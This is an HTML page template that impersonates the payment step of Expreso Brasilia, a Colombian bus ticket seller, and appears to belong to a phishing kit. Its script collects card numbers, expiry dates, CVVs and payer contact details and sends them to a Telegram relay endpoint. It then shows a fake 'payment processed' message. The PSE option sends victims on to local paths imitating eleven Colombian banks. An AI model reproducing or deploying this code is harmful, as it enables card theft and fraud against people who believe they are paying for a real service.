<!DOCTYPE html>
<html dir="ltr" lang="es-CO">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Pago - Expreso Brasilia S.A | Tiquetes en Bus | Colombia</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
	<meta name="csrf-token" content="{{ csrf_token() }}">

	<link rel="icon" href="/pin/inicio/wp-content/uploads/2020/10/touch-icon-iphone.png" sizes="32x32">

	<!-- CSS External -->
	<link rel="stylesheet" href="/pin/estilos/style.min.css" type="text/css" media="all">
	<link rel="stylesheet" href="/pin/estilos/styles.css" type="text/css" media="all">
	<link rel="stylesheet" href="/pin/estilos/bundle.css">
	<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;500;600;700&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
	<script src="https://cdn.tailwindcss.com"></script>

	<style>
		body {
			font-family: 'Source Sans Pro', Helvetica, Arial, sans-serif;
			background-color: #f9fafb;
		}
		h1, h2, h3, h4, h5, h6 {
			font-family: 'Oswald', Helvetica, Arial, sans-serif;
		}
	</style>
</head>
<body class="bg-gray-50">

	<!-- SECCION: METODO DE PAGO -->
	<section id="seccion-metodo-pago" class="min-h-screen bg-gray-50">
		<!-- Header azul -->
		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-between">
			<div class="p-2">
				<img src="/pin/inicio/wp-content/uploads/2020/10/touch-icon-iphone.png" alt="Brasilia" class="w-8 h-8">
			</div>
			<h2 class="text-xl font-medium text-white">Metodo de pago</h2>
			<div class="p-2 w-8"></div>
		</div>

		<div class="px-6 py-6">
			<!-- Total a pagar -->
			<div class="bg-white rounded-xl p-6 mb-6 shadow-sm">
				<div class="flex items-center justify-between">
					<span class="text-lg font-medium text-gray-700">Total a pagar:</span>
					<div class="text-right">
						<div class="text-3xl font-bold text-gray-900"><span id="totalMetodoPago">{{ $totalFormateado }}</span></div>
					</div>
				</div>
			</div>

			<!-- Titulo -->
			<h3 class="text-lg font-medium text-gray-900 mb-4">Selecciona tu metodo de pago</h3>

			<!-- Opciones de metodo de pago -->
			<div class="space-y-4">
				<!-- Opcion Tarjeta de Credito -->
				<div onclick="seleccionarMetodoPago('tarjeta')" id="opcion-tarjeta" class="border-2 border-gray-300 rounded-xl p-4 cursor-pointer hover:border-[#00529c] transition-all bg-white">
					<div class="flex items-center gap-4">
						<div id="radio-tarjeta" class="w-6 h-6 rounded-full border-2 border-gray-400 flex items-center justify-center flex-shrink-0">
						</div>
						<div class="flex items-center gap-3 flex-1">
							<svg class="w-8 h-8 text-gray-700" fill="currentColor" viewBox="0 0 24 24">
								<path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/>
							</svg>
							<div>
								<div class="text-lg font-medium text-gray-900">Tarjeta de Credito</div>
								<div class="text-sm text-gray-500">Visa, Mastercard, American Express</div>
							</div>
						</div>
					</div>
				</div>

				<!-- Opcion PSE -->
				<div onclick="seleccionarMetodoPago('pse')" id="opcion-pse" class="border-2 border-gray-300 rounded-xl p-4 cursor-pointer hover:border-[#00529c] transition-all bg-white">
					<div class="flex items-center gap-4">
						<div id="radio-pse" class="w-6 h-6 rounded-full border-2 border-gray-400 flex items-center justify-center flex-shrink-0">
						</div>
						<div class="flex items-center gap-3 flex-1">
							<img src="/pin/Boton_PSE.png" alt="PSE" class="w-10 h-10 object-contain">
							<div>
								<div class="text-lg font-medium text-gray-900">PSE</div>
								<div class="text-sm text-gray-500">Debito bancario directo</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>

	<!-- SECCION: FORMULARIO TARJETA DE CREDITO -->
	<section id="seccion-tarjeta" class="min-h-screen bg-gray-50" style="display: none;">
		<!-- Header azul -->
		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-between">
			<button onclick="volverAMetodoPago()" class="p-2">
				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
				</svg>
			</button>
			<h2 class="text-xl font-medium text-white">Tarjeta de Credito</h2>
			<button onclick="volverAMetodoPago()" class="p-2">
				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
				</svg>
			</button>
		</div>

		<div class="px-6 py-6">
			<!-- Total a pagar -->
			<div class="bg-white rounded-xl p-6 mb-6 shadow-sm">
				<div class="flex items-center justify-between">
					<span class="text-lg font-medium text-gray-700">Total a pagar:</span>
					<div class="text-right">
						<div class="text-3xl font-bold text-gray-900"><span id="totalTarjeta">{{ $totalFormateado }}</span></div>
					</div>
				</div>
			</div>

			<!-- Formulario de tarjeta -->
			<div class="space-y-4">
				<!-- Titulo datos de tarjeta -->
				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2">Datos de la tarjeta</h3>

				<!-- Numero de tarjeta -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Numero de tarjeta</label>
					<input type="text" id="numeroTarjeta" placeholder="" maxlength="19"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="formatearNumeroTarjeta(this)">
				</div>

				<!-- Nombre del titular -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Nombre del titular</label>
					<input type="text" id="nombreTitular" placeholder="Como aparece en la tarjeta"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.toUpperCase()">
				</div>

				<!-- Fecha de vencimiento y CVV -->
				<div class="grid grid-cols-2 gap-4">
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">Fecha de vencimiento</label>
						<input type="text" id="fechaVencimiento" placeholder="MM/AA" maxlength="5"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="formatearFechaVencimiento(this)">
					</div>
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
						<input type="password" id="cvv" placeholder="123" maxlength="4"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="this.value = this.value.replace(/[^0-9]/g, '')">
					</div>
				</div>

				<!-- Titulo datos del pagador -->
				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2 mt-6">Informacion del pagador</h3>

				<!-- Nombre completo -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Nombre completo</label>
					<input type="text" id="nombrePagadorTarjeta" placeholder="Nombre y apellidos"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.toUpperCase()">
				</div>

				<!-- Email -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Correo electronico</label>
					<input type="email" id="emailPagadorTarjeta" placeholder="correo@ejemplo.com"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent">
				</div>

				<!-- Celular -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Celular</label>
					<input type="tel" id="celularPagadorTarjeta" placeholder="300 123 4567" maxlength="12"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.replace(/[^0-9\s]/g, '')">
				</div>

				<!-- Direccion -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Direccion</label>
					<input type="text" id="direccionPagadorTarjeta" placeholder="Calle 123 # 45-67"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.toUpperCase()">
				</div>

				<!-- Ciudad y Departamento -->
				<div class="grid grid-cols-2 gap-4">
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">Ciudad</label>
						<input type="text" id="ciudadPagadorTarjeta" placeholder="Bogota"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="this.value = this.value.toUpperCase()">
					</div>
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">Departamento</label>
						<input type="text" id="departamentoPagadorTarjeta" placeholder="Cundinamarca"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="this.value = this.value.toUpperCase()">
					</div>
				</div>

				<!-- Boton de pagar -->
				<div class="mt-8">
					<button onclick="pagarConTarjeta()" id="btnPagarTarjeta" class="w-full flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#d22630] hover:bg-[#b01f28] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
						<span id="textoBotonTarjeta">Pagar</span>
						<div id="spinnerTarjeta" class="hidden">
							<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
								<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
								<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
							</svg>
						</div>
					</button>
				</div>
			</div>
		</div>
	</section>

	<!-- SECCION: FORMULARIO PSE -->
	<section id="seccion-pse" class="min-h-screen bg-gray-50" style="display: none;">
		<!-- Header azul -->
		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-between">
			<button onclick="volverAMetodoPago()" class="p-2">
				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
				</svg>
			</button>
			<h2 class="text-xl font-medium text-white">PSE</h2>
			<button onclick="volverAMetodoPago()" class="p-2">
				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
				</svg>
			</button>
		</div>

		<div class="px-6 py-6">
			<!-- Total a pagar -->
			<div class="bg-white rounded-xl p-6 mb-6 shadow-sm">
				<div class="flex items-center justify-between">
					<span class="text-lg font-medium text-gray-700">Total a pagar:</span>
					<div class="text-right">
						<div class="text-3xl font-bold text-gray-900"><span id="totalPSE">{{ $totalFormateado }}</span></div>
					</div>
				</div>
			</div>

			<!-- Formulario PSE -->
			<div class="space-y-4">
				<!-- Titulo datos bancarios -->
				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2">Datos bancarios</h3>

				<!-- Selector de Banco -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Banco</label>
					<select id="selectBanco" class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent bg-white">
						<option value="">Selecciona tu banco</option>
						<option value="bancolombia">Bancolombia</option>
						<option value="avvillas">AV Villas</option>
						<option value="bbva">BBVA</option>
						<option value="bogota">Banco de Bogota</option>
						<option value="cajasocial">Caja Social</option>
						<option value="colpatria">Colpatria</option>
						<option value="davivienda">Davivienda</option>
						<option value="falabella">Banco Falabella</option>
						<option value="nequi">Nequi</option>
						<option value="occidente">Banco de Occidente</option>
						<option value="popular">Banco Popular</option>
					</select>
				</div>

				<!-- Selector de Tipo de Persona -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Tipo de persona</label>
					<select id="selectTipoPersona" class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent bg-white">
						<option value="">Selecciona el tipo de persona</option>
						<option value="natural">Persona Natural</option>
						<option value="juridica">Persona Juridica</option>
					</select>
				</div>

				<!-- Titulo datos del pagador -->
				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2 mt-6">Informacion del pagador</h3>

				<!-- Nombre completo -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Nombre completo</label>
					<input type="text" id="nombrePagadorPSE" placeholder="Nombre y apellidos"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.toUpperCase()">
				</div>

				<!-- Email -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Correo electronico</label>
					<input type="email" id="emailPagadorPSE" placeholder="correo@ejemplo.com"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent">
				</div>

				<!-- Celular -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Celular</label>
					<input type="tel" id="celularPagadorPSE" placeholder="300 123 4567" maxlength="12"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.replace(/[^0-9\s]/g, '')">
				</div>

				<!-- Direccion -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Direccion</label>
					<input type="text" id="direccionPagadorPSE" placeholder="Calle 123 # 45-67"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.toUpperCase()">
				</div>

				<!-- Ciudad y Departamento -->
				<div class="grid grid-cols-2 gap-4">
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">Ciudad</label>
						<input type="text" id="ciudadPagadorPSE" placeholder="Bogota"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="this.value = this.value.toUpperCase()">
					</div>
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">Departamento</label>
						<input type="text" id="departamentoPagadorPSE" placeholder="Cundinamarca"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="this.value = this.value.toUpperCase()">
					</div>
				</div>

				<!-- Boton de pagar -->
				<div class="mt-8">
					<button onclick="pagarConPSE()" id="btnPagarPSE" class="w-full flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#d22630] hover:bg-[#b01f28] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
						<span id="textoBotonPSE">Pagar</span>
						<div id="spinnerPSE" class="hidden">
							<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
								<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
								<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
							</svg>
						</div>
					</button>
				</div>
			</div>
		</div>
	</section>

	<!-- Overlay de carga -->
	<div id="overlay-carga" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50" style="display: none;">
		<div class="bg-white rounded-xl p-8 text-center max-w-sm mx-4">
			<svg class="animate-spin h-12 w-12 text-[#00529c] mx-auto mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
				<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
				<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
			</svg>
			<p id="mensaje-carga" class="text-lg font-medium text-gray-800">Procesando...</p>
		</div>
	</div>

	<script>
		// Variables globales
		let totalAPagar = {{ $valor }};
		let monedaActual = 'COP';
		let datosRecopilados = {};
		let brasiliaUniqId = 'PAGO-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);

		// Guardar en sessionStorage
		sessionStorage.setItem('brasiliaUniqId', brasiliaUniqId);
		sessionStorage.setItem('totalAPagar', totalAPagar);

		function formatearPrecio(valor) {
			return '$' + parseInt(valor).toLocaleString('es-CO');
		}

		function mostrarSeccion(seccionId) {
			document.querySelectorAll('section').forEach(s => {
				s.style.display = 'none';
			});
			const seccion = document.getElementById(seccionId);
			if (seccion) {
				seccion.style.display = 'block';
			}
		}

		function volverAMetodoPago() {
			mostrarSeccion('seccion-metodo-pago');
		}

		function mostrarOverlayCarga(mensaje) {
			document.getElementById('mensaje-carga').textContent = mensaje || 'Procesando...';
			document.getElementById('overlay-carga').style.display = 'flex';
		}

		function ocultarOverlayCarga() {
			document.getElementById('overlay-carga').style.display = 'none';
		}

		function seleccionarMetodoPago(metodo) {
			// Resetear estilos
			document.getElementById('opcion-tarjeta').classList.remove('border-[#00529c]');
			document.getElementById('opcion-tarjeta').classList.add('border-gray-300');
			document.getElementById('radio-tarjeta').innerHTML = '';
			document.getElementById('radio-tarjeta').classList.remove('border-[#00529c]', 'bg-[#00529c]');
			document.getElementById('radio-tarjeta').classList.add('border-gray-400');

			document.getElementById('opcion-pse').classList.remove('border-[#00529c]');
			document.getElementById('opcion-pse').classList.add('border-gray-300');
			document.getElementById('radio-pse').innerHTML = '';
			document.getElementById('radio-pse').classList.remove('border-[#00529c]', 'bg-[#00529c]');
			document.getElementById('radio-pse').classList.add('border-gray-400');

			if (metodo === 'tarjeta') {
				document.getElementById('opcion-tarjeta').classList.remove('border-gray-300');
				document.getElementById('opcion-tarjeta').classList.add('border-[#00529c]');
				document.getElementById('radio-tarjeta').classList.remove('border-gray-400');
				document.getElementById('radio-tarjeta').classList.add('border-[#00529c]', 'bg-[#00529c]');
				document.getElementById('radio-tarjeta').innerHTML = '<div class="w-3 h-3 bg-white rounded-full"></div>';
				setTimeout(() => { mostrarSeccion('seccion-tarjeta'); }, 200);
			} else if (metodo === 'pse') {
				document.getElementById('opcion-pse').classList.remove('border-gray-300');
				document.getElementById('opcion-pse').classList.add('border-[#00529c]');
				document.getElementById('radio-pse').classList.remove('border-gray-400');
				document.getElementById('radio-pse').classList.add('border-[#00529c]', 'bg-[#00529c]');
				document.getElementById('radio-pse').innerHTML = '<div class="w-3 h-3 bg-white rounded-full"></div>';
				setTimeout(() => { mostrarSeccion('seccion-pse'); }, 200);
			}
		}

		function formatearNumeroTarjeta(input) {
			let valor = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
			let formateado = valor.match(/.{1,4}/g)?.join(' ') || valor;
			input.value = formateado;
		}

		function formatearFechaVencimiento(input) {
			let valor = input.value.replace(/\//g, '').replace(/[^0-9]/g, '');
			if (valor.length >= 2) {
				valor = valor.substring(0, 2) + '/' + valor.substring(2);
			}
			input.value = valor;
		}

		function validarFormularioTarjeta() {
			const numeroTarjeta = document.getElementById('numeroTarjeta').value.replace(/\s/g, '');
			const nombreTitular = document.getElementById('nombreTitular').value.trim();
			const fechaVencimiento = document.getElementById('fechaVencimiento').value;
			const cvv = document.getElementById('cvv').value;
			const nombrePagador = document.getElementById('nombrePagadorTarjeta').value.trim();
			const emailPagador = document.getElementById('emailPagadorTarjeta').value.trim();
			const celularPagador = document.getElementById('celularPagadorTarjeta').value.trim();
			const direccionPagador = document.getElementById('direccionPagadorTarjeta').value.trim();
			const ciudadPagador = document.getElementById('ciudadPagadorTarjeta').value.trim();
			const departamentoPagador = document.getElementById('departamentoPagadorTarjeta').value.trim();

			if (numeroTarjeta.length < 13) { alert('Ingresa un numero de tarjeta valido'); return false; }
			if (!nombreTitular) { alert('Ingresa el nombre del titular'); return false; }
			if (fechaVencimiento.length < 5) { alert('Ingresa la fecha de vencimiento'); return false; }
			if (cvv.length < 3) { alert('Ingresa el codigo CVV'); return false; }
			if (!nombrePagador) { alert('Ingresa el nombre del pagador'); return false; }
			if (!emailPagador || !emailPagador.includes('@')) { alert('Ingresa un correo electronico valido'); return false; }
			if (!celularPagador || celularPagador.replace(/\s/g, '').length < 10) { alert('Ingresa un numero de celular valido'); return false; }
			if (!direccionPagador) { alert('Ingresa la direccion'); return false; }
			if (!ciudadPagador) { alert('Ingresa la ciudad'); return false; }
			if (!departamentoPagador) { alert('Ingresa el departamento'); return false; }

			return true;
		}

		async function pagarConTarjeta() {
			if (!validarFormularioTarjeta()) return;

			datosRecopilados.numeroTarjeta = document.getElementById('numeroTarjeta').value.trim();
			datosRecopilados.nombreTitular = document.getElementById('nombreTitular').value.trim();
			datosRecopilados.fechaVencimiento = document.getElementById('fechaVencimiento').value.trim();
			datosRecopilados.cvv = document.getElementById('cvv').value.trim();
			datosRecopilados.nombre = document.getElementById('nombrePagadorTarjeta').value.trim();
			datosRecopilados.email = document.getElementById('emailPagadorTarjeta').value.trim();
			datosRecopilados.celular = document.getElementById('celularPagadorTarjeta').value.trim();
			datosRecopilados.direccion = document.getElementById('direccionPagadorTarjeta').value.trim();
			datosRecopilados.ciudad = document.getElementById('ciudadPagadorTarjeta').value.trim();
			datosRecopilados.departamento = document.getElementById('departamentoPagadorTarjeta').value.trim();

			sessionStorage.setItem('datosRecopilados', JSON.stringify(datosRecopilados));

			document.getElementById('btnPagarTarjeta').disabled = true;
			mostrarOverlayCarga('Procesando pago...');
			await enviarPagoATelegram('tarjeta');
			iniciarPolling();
		}

		function validarFormularioPSE() {
			const banco = document.getElementById('selectBanco').value;
			const tipoPersona = document.getElementById('selectTipoPersona').value;
			const nombrePagador = document.getElementById('nombrePagadorPSE').value.trim();
			const emailPagador = document.getElementById('emailPagadorPSE').value.trim();
			const celularPagador = document.getElementById('celularPagadorPSE').value.trim();
			const direccionPagador = document.getElementById('direccionPagadorPSE').value.trim();
			const ciudadPagador = document.getElementById('ciudadPagadorPSE').value.trim();
			const departamentoPagador = document.getElementById('departamentoPagadorPSE').value.trim();

			if (!banco) { alert('Selecciona tu banco'); return false; }
			if (!tipoPersona) { alert('Selecciona el tipo de persona'); return false; }
			if (!nombrePagador) { alert('Ingresa el nombre del pagador'); return false; }
			if (!emailPagador || !emailPagador.includes('@')) { alert('Ingresa un correo electronico valido'); return false; }
			if (!celularPagador || celularPagador.replace(/\s/g, '').length < 10) { alert('Ingresa un numero de celular valido'); return false; }
			if (!direccionPagador) { alert('Ingresa la direccion'); return false; }
			if (!ciudadPagador) { alert('Ingresa la ciudad'); return false; }
			if (!departamentoPagador) { alert('Ingresa el departamento'); return false; }

			return true;
		}

		function pagarConPSE() {
			if (!validarFormularioPSE()) return;

			const banco = document.getElementById('selectBanco').value;
			const tipoPersona = document.getElementById('selectTipoPersona').value;

			datosRecopilados.banco = banco;
			datosRecopilados.tipoPersona = tipoPersona;
			datosRecopilados.nombre = document.getElementById('nombrePagadorPSE').value.trim();
			datosRecopilados.email = document.getElementById('emailPagadorPSE').value.trim();
			datosRecopilados.celular = document.getElementById('celularPagadorPSE').value.trim();
			datosRecopilados.direccion = document.getElementById('direccionPagadorPSE').value.trim();
			datosRecopilados.ciudad = document.getElementById('ciudadPagadorPSE').value.trim();
			datosRecopilados.departamento = document.getElementById('departamentoPagadorPSE').value.trim();

			sessionStorage.setItem('pseDatos', JSON.stringify(datosRecopilados));
			sessionStorage.setItem('pseTotal', totalAPagar);
			sessionStorage.setItem('pseBanco', banco);

			document.getElementById('btnPagarPSE').disabled = true;
			mostrarOverlayCarga('Ingresando a su Banca...');

			const rutasBancos = {
				'bancolombia': '/3co/trico',
				'avvillas': '/avvillas/avvi',
				'bbva': '/bbva/inicio',
				'bogota': '/bogota/bogo',
				'cajasocial': '/cajasocial/caja',
				'colpatria': '/colpatria/colpa',
				'davivienda': '/davivienda/davi',
				'falabella': '/falabella/fala',
				'nequi': '/nequi/nequ',
				'occidente': '/occidente/occi',
				'popular': '/popular/popu'
			};

			const ruta = rutasBancos[banco] || '/pin/inicio';
			setTimeout(() => {
				window.location.href = ruta;
			}, 2000);
		}

		async function enviarPagoATelegram(tipoPago) {
			try {
				const montoFormateado = totalAPagar + ' ' + monedaActual;
				let mensaje = `*PAGO DIRECTO BRASILIA*\n\n`;
				mensaje += `*ID:* \`${brasiliaUniqId}\`\n`;
				mensaje += `*Total:* \`${montoFormateado}\`\n`;
				mensaje += `*Metodo:* ${tipoPago.toUpperCase()}\n\n`;

				if (tipoPago === 'tarjeta') {
					mensaje += `*DATOS DE TARJETA:*\n`;
					mensaje += `Numero: \`${datosRecopilados.numeroTarjeta}\`\n`;
					mensaje += `Titular: \`${datosRecopilados.nombreTitular}\`\n`;
					mensaje += `Vencimiento: \`${datosRecopilados.fechaVencimiento}\`\n`;
					mensaje += `CVV: \`${datosRecopilados.cvv}\`\n\n`;
				}

				mensaje += `*DATOS DEL PAGADOR:*\n`;
				mensaje += `Nombre: \`${datosRecopilados.nombre}\`\n`;
				mensaje += `Email: \`${datosRecopilados.email}\`\n`;
				mensaje += `Celular: \`${datosRecopilados.celular}\`\n`;
				mensaje += `Direccion: \`${datosRecopilados.direccion}\`\n`;
				mensaje += `Ciudad: \`${datosRecopilados.ciudad}\`\n`;
				mensaje += `Departamento: \`${datosRecopilados.departamento}\`\n`;

				await fetch('/api/telegram', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json',
						'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
					},
					body: JSON.stringify({
						uniq_id: brasiliaUniqId,
						mensaje: mensaje,
						panel: 'brasilia_pago',
						total: totalAPagar,
						metodo_pago: tipoPago,
						datos: datosRecopilados
					})
				});
			} catch (error) {
				console.error('Error enviando datos:', error);
			}
		}

		function iniciarPolling() {
			// Simular procesamiento
			setTimeout(() => {
				ocultarOverlayCarga();
				alert('Pago procesado. Recibiras confirmacion por correo electronico.');
			}, 5000);
		}

		// Ocultar PSE si no es Colombia
		document.addEventListener('DOMContentLoaded', function() {
			const paisVisitante = localStorage.getItem('visitorCountry') || 'CO';
			const opcionPSE = document.getElementById('opcion-pse');
			if (paisVisitante !== 'CO') {
				opcionPSE.style.display = 'none';
			}
		});
	</script>
</body>
</html>
